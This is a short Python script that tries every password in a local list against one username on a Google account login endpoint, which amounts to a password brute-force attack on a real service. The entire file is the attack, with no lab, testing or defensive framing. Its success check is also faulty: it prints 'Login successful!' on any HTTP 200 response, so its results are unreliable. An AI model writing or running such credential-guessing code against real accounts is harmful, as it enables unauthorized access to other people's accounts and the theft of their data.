import requests

def login(username, password):
    url = "https://www.google.com/accounts/ServiceLoginAuth"
    data = {
        "Email": username,
        "Passwd": password,
        "signIn": "Sign in",
        "continue": "https://www.google.com/"
    }

    response = requests.post(url, data=data)

    if response.status_code == 200:
        print("Login successful!")
    else:
        print("Login failed!")

def try_login_with_passwords(username, password_file):
    with open(password_file, "r") as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        login(username, password)

def main():
    username = input("Enter your username: ")
    password_file = "passwords.txt"
    try_login_with_passwords(username, password_file)

if __name__ == "__main__":
    main()
